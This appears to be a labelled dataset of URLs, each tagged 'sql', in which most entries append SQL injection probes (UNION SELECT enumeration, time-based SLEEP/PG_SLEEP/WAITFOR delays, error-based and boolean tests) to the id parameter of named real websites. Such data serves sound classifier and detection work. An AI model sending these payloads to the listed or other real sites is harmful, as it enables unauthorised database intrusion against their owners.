1,sql,http : / / www . romanianwriters . ro / s . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL - - vGXN
2,sql,http : / / www . bible - history . com / subcat . php ? id = 1;SELECT PG_SLEEP ( 5 ) - - 
3,sql,http : / / ruscongrmech2015 . ru / index . php ? id = 1 ' ) AND SLEEP ( 5 ) AND ( ' GJyr ' = ' GJyr
4,sql,http : / / berkeleyrecycling . org / page . php ? id = 1 ' ) AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) AND ( ' VgiB ' = ' VgiB
5,sql,http : / / www . xrayrisk . com / calculator / calculator - normal - studies . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL - - Lunn
6,sql,http : / / 193 . 232 . 218 . 56 / web - local / prep / rj / index . php ? id = 1 % ' AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) AND ' % ' = ' 
8,sql,https : / / www . fleurlis . com . tw / en / wedding . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL - - IshX
9,sql,http : / / www . dipintoguitars . com / category . php ? id = 1 ) UNION ALL SELECT NULL - - fqfI
10,sql,http : / / www . teamgear . us / store . php ? id = 1 ) UNION ALL SELECT NULL , NULL - - EXrh
11,sql,http : / / www . multan . gov . pk / files . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL - - fKpc
12,sql,http : / / www . asfaa . org / members . php ? id = 1 ' ) AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ( ' bARY ' = ' bARY
13,sql,http : / / www . bpc . gov . bd / contactus . php ? id = 1 ORDER BY 4721 - - gPsZ
14,sql,https : / / metacarpolis . com / index . php ? id = 1 AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) - - sFCM
15,sql,http : / / www . jbctools . com / cataleg . php ? id = 1 ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - CEEX
17,sql,http : / / ansobor . ru / page . php ? id = ( SELECT ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 2394 = 2394 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) ) 
18,sql,http : / / www . khrunichev . ru / main . php ? id = 1 ) AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) AND ( 9475 = 9475
19,sql,http : / / www . studentvote . ca / 2011 / results / index . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL - - SOSW
20,sql,https : / / www . orthphoto . net / user . php ? id = 1 ' ) AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ( ' bARY ' = ' bARY
21,sql,http : / / esjindex . org / search . php ? id = 1 AND 2076 = 1452 - - zXSW
22,sql,http : / / www . sansihotels . com / hotels . php ? id = 1;WAITFOR DELAY ' 0 : 0 : 5 ' - - 
23,sql,http : / / www . adopfrance . fr / gb / galerie / index . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL - - mqyP
24,sql,http : / / www . akko . org . il / map_en . php ? id = 1 ' AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ' VCNg ' = ' VCNg
25,sql,http : / / www . paranatural . net / index . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - dLhL
26,sql,http : / / www . photobiology . org / asp . php ? id = 1 ) ORDER BY 1 - - zRhc
29,sql,http : / / www . stateofdesign . berlin / subevents . php ? id = 1 ' ;SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 84 ) | | CHR ( 106 ) | | CHR ( 102 ) | | CHR ( 83 ) , 5 ) FROM DUAL - - 
30,sql,https : / / www . acme . in / contentpage . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - BMLy
31,sql,http : / / www . komiaviatrans . ru / airport / index . php ? id = 1 AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) - - VWJB
32,sql,http : / / www . cdep . ru / index . php ? id = 1 % ' AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) AND ' % ' = ' 
33,sql,http : / / www . peml . com / login . php ? rtn_url = http : / / www . peml . com / category . php ? id = 1 AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) - - sFCM
34,sql,http : / / www . palfi . net / partners . php ? id = 1 AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) 
35,sql,http : / / www . sabella . fr / fiche . php ? id = 1 ' AND 3611 = 3611 AND ' oygD ' = ' oygD
36,sql,http : / / electronautomotive . com / order . php ? id = 1 ORDER BY 1 - - lAea
37,sql,http : / / en . firenze - online . com / shops / florence - shop . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL - - fKpc
38,sql,http : / / www . pidsphil . org / journal_info . php ? id = ( SELECT CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 5838 = 5838 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) 
39,sql,http : / / www . egscomics . com / index . php ? id = 1 ' NKZqCS< ' ">bIRAbA
40,sql,https : / / 100wonders . ru / index . php ? id = ( SELECT ( CASE WHEN ( 9362 = 8798 ) THEN 9362 ELSE 9362* ( SELECT 9362 FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) 
41,sql,http : / / www . ifsb . org / membership . php ? id = 1 ) AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ( 9963 = 9963
42,sql,https : / / www . ocsalumni . org / events / cart . php ? id = 1 % ' AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ' % ' = ' 
43,sql,http : / / www . ssy . org / detail . php ? id = 1 ' ORDER BY 1 - - Hgvf
44,sql,http : / / www . micwaudio . com / product . php ? id = 1 AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) 
45,sql,http : / / www . smart - ground . eu / partner . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL - - Dvxx
46,sql,http : / / www . lambbuilding . co . uk / members / profile . php ? id = 1 % ' AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ' % ' = ' 
47,sql,http : / / www . minutesemeiotic . org / home . php ? id = 1;SELECT PG_SLEEP ( 5 ) - - 
48,sql,http : / / pedlib . ru / katalogy / katalog . php ? id = 1 ' ) AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) AND ( ' mQhu ' = ' mQhu
49,sql,http : / / bestindustrygroup . com / news . php ? id = 1 ) AND 3611 = 3611 AND ( 5554 = 5554
50,sql,http : / / cityvis . io / detail . php ? id = 1 ' AND 3611 = 3611 AND ' oygD ' = ' oygD
51,sql,http : / / www . fairtradegroupnepal . org / about . php ? id = 1 AND SLEEP ( 5 ) - - THvg
52,sql,http : / / www . cacert . org / index . php ? id = 1 ' ) ORDER BY 1 - - tslS
53,sql,http : / / koshi . fr / achat / produit_details . php ? id = 1 ) ;SELECT PG_SLEEP ( 5 ) - - 
54,sql,http : / / vlab . co . in / ba_labs_all . php ? id = 1 ) ;SELECT PG_SLEEP ( 5 ) - - 
55,sql,http : / / ewfed . com / cat . php ? id = 1 ) ;SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 84 ) | | CHR ( 106 ) | | CHR ( 102 ) | | CHR ( 83 ) , 5 ) FROM DUAL - - 
56,sql,https : / / www . kunstreservebank . nl / index . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - wXih
57,sql,http : / / www . cqfa . ca / public / index . php ? id = 1 ' ) ORDER BY 1 - - tslS
58,sql,https : / / www . free - country - flags . com / flag_pack . php ? id = 1 ' ) ORDER BY 1 - - tslS
59,sql,http : / / www . carrot - home . com / project . php ? id = 1 ) AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ( 9963 = 9963
60,sql,https : / / www . partnerschulnetz . de / index . php ? id = ( SELECT ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 2394 = 2394 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) ) 
61,sql,https : / / www . albinagroup . com / products . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - JiPD
62,sql,http : / / modniditky . com / katalog . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL - - lXro
63,sql,http : / / www . evanscartoons . com / gallery . php ? id = 1 AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) - - Qmvu
64,sql,http : / / paritarian - funds - construction . eu / page . php ? id = 1 ' AND 7019 = 2399 AND ' bmfB ' = ' bmfB
65,sql,https : / / www . jannah . ae / hotels . php ? id = 1 AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) 
66,sql,http : / / www . nm . cz / publikace / publikace - detail - en . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL - - rvrn
67,sql,http : / / xn - - 149 - 5cd9ame0ai0a4e5b . xn - - p1ai / page . php ? id = 1 ' ) AND 3611 = 3611 AND ( ' xpHU ' = ' xpHU
68,sql,http : / / www . daiichisankyo . co . th / aboutus . php ? id = ( SELECT ( CASE WHEN ( 3684 = 3684 ) THEN 3684 ELSE 3684* ( SELECT 3684 FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) 
69,sql,http : / / www . epomm . eu / maxeva / index . php ? id = 1 ) AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ( 9963 = 9963
70,sql,http : / / www . skystartravels . com / gallery . php ? id = 1 % ' AND 3611 = 3611 AND ' % ' = ' 
72,sql,http : / / www . sakhalinprokur . ru / contacts . php ? id = 1 % ' AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) AND ' % ' = ' 
73,sql,http : / / dance . vftsarr . ru / index . php ? id = 1 AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) - - VWJB
74,sql,http : / / gtrkchita . ru / listen . php ? id = 1 AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) - - VWJB
75,sql,https : / / learnzone . org . uk / courses / course . php ? id = 1 AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) - - sFCM
76,sql,http : / / www . jannahplace . com / hotels . php ? id = 1 ' ) WAITFOR DELAY ' 0 : 0 : 5 ' AND ( ' RIHg ' = ' RIHg
77,sql,http : / / www . rgcms . edu . in / research . php ? id = 1 ) AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ( 2513 = 2513
78,sql,http : / / www . nordicbook . ru / index . php ? id = ( SELECT ( CASE WHEN ( 3684 = 3684 ) THEN 3684 ELSE 3684* ( SELECT 3684 FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) 
79,sql,https : / / vstomp . hotoneaudio . com / ProductsDetail . php ? id = 1;SELECT PG_SLEEP ( 5 ) - - 
81,sql,http : / / www . strail . de / index . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL - - sBcc
82,sql,http : / / www . ohmsghana . com / pages / services . php ? id = 1 % ' ;WAITFOR DELAY ' 0 : 0 : 5 ' - - 
83,sql,http : / / www . kvm . co . ke / products . php ? id = 1 ' UNION ALL SELECT NULL - - lmXC
84,sql,http : / / www . professor - butakov . ru / history / view_history . php ? id = 1 ) UNION ALL SELECT NULL , NULL - - EXrh
85,sql,http : / / www . indembassy . be / pages . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL - - rjiF
86,sql,http : / / www . smtmax . com / category . php ? id = 1 ) AND SLEEP ( 5 ) AND ( 7824 = 7824
87,sql,http : / / www . mirraketok . ru / subs . php ? id = 1 % ' AND SLEEP ( 5 ) AND ' % ' = ' 
88,sql,http : / / www . arion . ru / template . php ? id = 1 % ' AND 3611 = 3611 AND ' % ' = ' 
89,sql,http : / / www . myappterms . com / reader . php ? id = 1 ) AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) AND ( 4586 = 4586
90,sql,http : / / www . ictet . org / list % 2Bmember . php ? id = 1 ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - Cgcm
92,sql,http : / / www . unifr . ch / form / iaupe_32 / view . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL - - Dvxx
93,sql,http : / / www . millennium - tech . net / serviceInfo . php ? id = 1 ' ) AND 7457 = 2191 AND ( ' iHjE ' = ' iHjE
94,sql,http : / / www . jdcaravan . com / store . php ? id = 1 AND 2076 = 1452 - - zXSW
95,sql,https : / / www . nationaloil . co . ke / site / 2 . php ? id = 1 % ' ;SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 84 ) | | CHR ( 106 ) | | CHR ( 102 ) | | CHR ( 83 ) , 5 ) FROM DUAL - - 
96,sql,https : / / www . crocodile . com . hk / en / webpage . php ? id = 1 ) ORDER BY 1 - - zRhc
97,sql,http : / / www . icona . info / content . php ? id = 1 ' ) AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) AND ( ' VgiB ' = ' VgiB
98,sql,http : / / www1 . clermont . inra . fr / wq / index . php ? id = 1 ' ) AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ' DVsm ' = ' DVsm
99,sql,http : / / www . shorttrackonline . info / web - tv . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL - - PViD
101,sql,http : / / safring . adu . org . za / content . php ? id = 1 ' AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ' JKvn ' = ' JKvn
102,sql,http : / / www . phpsimplicity . com / tips . php ? id = 1 ) AND 3611 = 3611 AND ( 5554 = 5554
104,sql,https : / / ticketpay . jp / support_page . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL , NULL - - atbf
105,sql,https : / / www . aaaauto . eu / en / users . php ? id = 1 ' ) AND 3611 = 3611 AND ( ' xpHU ' = ' xpHU
106,sql,http : / / www . mvpvo . ru / inner . php ? id = 1 % ' UNION ALL SELECT NULL - - rJyU
108,sql,https : / / www . law . cuhk . edu . hk / en / people / info . php ? id = 1 ' ;WAITFOR DELAY ' 0 : 0 : 5 ' - - 
110,sql,https : / / www . cmu . ac . th / en / engaboutcmu . php ? id = 1 % ' AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) AND ' % ' = ' 
111,sql,https : / / www . indianembassythimphu . bt / pages . php ? id = 1 ORDER BY 1 - - lAea
114,sql,https : / / www . tonfly . com / helmet . php ? id = 1 AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) 
115,sql,http : / / www . polosub . com / scheda_mute_en . php ? id = 1 ' NKZqCS< ' ">bIRAbA
116,sql,https : / / xn - - 80aaejurlecbd2k8c . xn - - p1ai / index . php ? id = ( SELECT ( CASE WHEN ( 9362 = 8798 ) THEN 9362 ELSE 9362* ( SELECT 9362 FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) 
117,sql,http : / / www . sinohytec . com / en / page . php ? id = 1 ' ) AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) AND ( ' eWKx ' = ' eWKx
118,sql,https : / / friendsofscience . org / index . php ? id = ( SELECT CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 5838 = 5838 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) 
119,sql,http : / / www . blessgans . de / index . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - IKMj
120,sql,http : / / www . zentrumexil . at / index . php ? id = 1 ' AND SLEEP ( 5 ) AND ' itCe ' = ' itCe
121,sql,https : / / www . laboshop . com / index . php ? id = 1 % ' ;WAITFOR DELAY ' 0 : 0 : 5 ' - - 
122,sql,http : / / www . stalmax . com / index . php ? id = 1 AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) 
123,sql,https : / / rational . org / index . php ? id = 1 UNION ALL SELECT NULL , NULL - - ctvb
124,sql,https : / / library . geraldika . ru / book . php ? id = 1 AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) - - sFCM
125,sql,http : / / www . redtory . com . cn / english / about . php ? id = 1 ' AND 7019 = 2399 AND ' bmfB ' = ' bmfB
126,sql,http : / / www . innofader . com / products . php ? id = 1 AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) 
127,sql,http : / / www . freescience . info / books . php ? id = 1 ) UNION ALL SELECT NULL , NULL - - EXrh
128,sql,http : / / www . treeviewthai . com / service_en . php ? id = 1 ORDER BY 1 - - lAea
129,sql,http : / / www . ghanatimber . org / certification_details . php ? id = 1 AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) 
131,sql,http : / / venusita - moda . com / article . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - itKr
132,sql,http : / / byglearning . co . uk / mrcrsc - lms / course / category . php ? id = 1 ) ORDER BY 1 - - zRhc
133,sql,http : / / www . mcdonalds . co . jp / quality / allergy_Nutrition / nutrient2 . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - itKr
134,sql,http : / / www . energyquest . com . au / reports . php ? id = 1 ) AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) AND ( 9475 = 9475
135,sql,http : / / www . rideitmoto . com / products_list1 . php ? id = 1 ) AND 3611 = 3611 AND ( 5554 = 5554
137,sql,http : / / www . tdap . gov . pk / trade - bodies . php ? id = 1 ORDER BY 1 - - kzEn
138,sql,https : / / www . ileswastesystems . co . uk / index . php ? id = 1 ORDER BY 1 - - lAea
140,sql,https : / / mahara . org / group / view . php ? id = 1 % ' AND 3611 = 3611 AND ' % ' = ' 
141,sql,http : / / www . palavrion . com / index . php ? id = 1 ' ;WAITFOR DELAY ' 0 : 0 : 5 ' - - 
143,sql,https : / / www . indianembassy . de / pages . php ? id = 6787
144,sql,https : / / www . dt - shop . com / index . php ? id = 1 AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) 
145,sql,http : / / www . gulf1bank . com / page . php ? id = 1 ' NKZqCS< ' ">bIRAbA
146,sql,http : / / www . nsb . gov . bt / publication / publications . php ? id = 5845
147,sql,http : / / www . cubana . ru / about . php ? id = 1 ' WAITFOR DELAY ' 0 : 0 : 5 ' AND ' cIcm ' = ' cIcm
148,sql,http : / / nursing . flinders . edu . au / students / studyaids / drugcalculations / page . php ? id = 1 ' ) AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ( ' JGjZ ' = ' JGjZ
149,sql,http : / / outbacklabs . com / listing . php ? id = 1 ' UNION ALL SELECT NULL - - lmXC
150,sql,http : / / www . viparspectra . com / category . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL - - fKpc
151,sql,http : / / silverstateenergy . org / announcement . php ? id = 1 ) UNION ALL SELECT NULL , NULL - - EXrh
152,sql,https : / / edlinked . soe . waikato . ac . nz / research / journal / index . php ? id = 1" ) ) ) ( , , ) ' ) 
